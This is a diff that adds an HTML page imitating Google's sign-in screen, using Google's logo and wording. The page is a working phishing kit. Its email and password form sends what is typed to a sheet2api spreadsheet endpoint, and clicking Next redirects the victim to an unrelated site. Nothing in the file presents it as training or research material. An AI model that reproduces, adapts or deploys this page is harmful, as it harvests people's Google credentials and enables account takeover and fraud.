@@ -1,0 +1,153 @@
+
+  <!DOCTYPE html>
+  <html lang="en">
+  <head>
+      <meta charset="UTF-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Document</title>
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
+  </head>
+  <style>
+  body{
+      font-family: 'Roboto', sans-serif;
+  }
+  .container {
+      font-family: 'Roboto', sans-serif;
+    display: flex;
+    height: 100vh;
+    font-family: Google Sans;
+    user-select: none;
+  }
+  .card {
+    background: #fff;
+    width: 412px;
+    height: auto;
+    padding: 48px 36px;
+    border-radius: 8px;
+    border: 1px solid #cacaca;
+    margin: auto;
+  }
+  .header {
+    text-align: center;
+    font-weight: 400;
+  }
+  .title {
+      font-family: 'Roboto', sans-serif;
+
+    padding: 15px 0;
+    font-size: 24px;
+  }
+  .tagline {
+    font-size: 16px;
+    padding-bottom: 18px;
+  }
+  label {
+      font-family: 'Roboto', sans-serif;
+
+    display: block;
+    position: absolute;
+    padding: 0 5px;
+    width: auto;
+    color: #5f6368;
+    background: #fff;
+    transition: all 150ms ease;
+    transform: translate(12px, -37px);
+    cursor: text;
+  }
+  input {
+    padding: 16px;
+    margin-top: 20px;
+    font-size: 17px;
+    background: #fff;
+    width: calc(100% - 36px);
+    border: 1px solid #cacaca;
+    border-radius: 5px;
+  }
+  input:focus {
+    outline: none;
+    /* Compensate increased border with padding */
+    padding: 15px;
+    border: 2px solid #1a73e8;
+  }
+  input:not(:placeholder-shown) + label, input:focus + label {
+    transform: translate(8px, -62px);
+    font-size: 13px;
+  }
+  input:focus + label {
+    color: #1a73e8;
+  }
+  .links {
+    color: #1a73e8;
+    font-size: 14px;
+    padding-top: 10px;
+    cursor: pointer;
+    font-weight: 500;
+  }
+  .guest {
+    margin-top: 32px;
+    font-size: 14px;
+    color: #5f6368;
+  }
+  .login-bar {
+    margin-top: 32px;
+    display: flex;
+    flex-wrap: wrap;
+  }
+  .next {
+    margin-left: auto;
+    padding: 10px 30px;
+    border-radius: 5px;
+    cursor: pointer;
+    color: #fff;
+    outline: none;
+    border: none;
+    background: #1a73e8;
+    font-weight: 500;
+  }
+  .next:hover {
+    background: #4285f4;
+  }
+  @media only screen and (max-width: 600px) {
+    .card {
+      border: none;
+    }
+  }
+  </style>
+  <body>
+    <div class='container'>
+      <div class='card'>
+        <div class='header'>
+          <img alt='Google' height='24' src='https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg'/>
+          <div class='title'>Sign in</div>
+          <div class='tagline'>Use your Google Account</div>
+        </div>
+    <form data-spreadsheet-api='https://sheet2api.com/v1/2tAaaSbvQ5y2/sectwo/Sectwo'>
+        <input id='Name' name='Name' placeholder=' ' type='text'/>
+        <label for='Name'>Email or phone</label>
+        <input id='Disc' name='Disc' placeholder=' ' type='password'/>
+        <label for='Disc'>Password</label>
+        <div class='links'>Forgot email?</div>
+        <div class='guest'>Not your computer? Use Guest mode to sign in privately.</div>
+        <div class='links'>Learn more</div>
+        <div class='login-bar'>
+          <div class='links'>Create account</div>
+            <button class='next' id='oks' type='submit'>Next</button>
+      </div>
+          </form>
+        
+        <script src='https://sheet2api.com/v1/template.js'/>
+        </div>
+      </div>
+      <script>
+        document.getElementById("oks").addEventListener("click", myFunction);  
+        function myFunction() {  
+          window.location.href="http://programminghead.com";  
+        }
+      </script>
+      
+  </body>
+  </html>
+
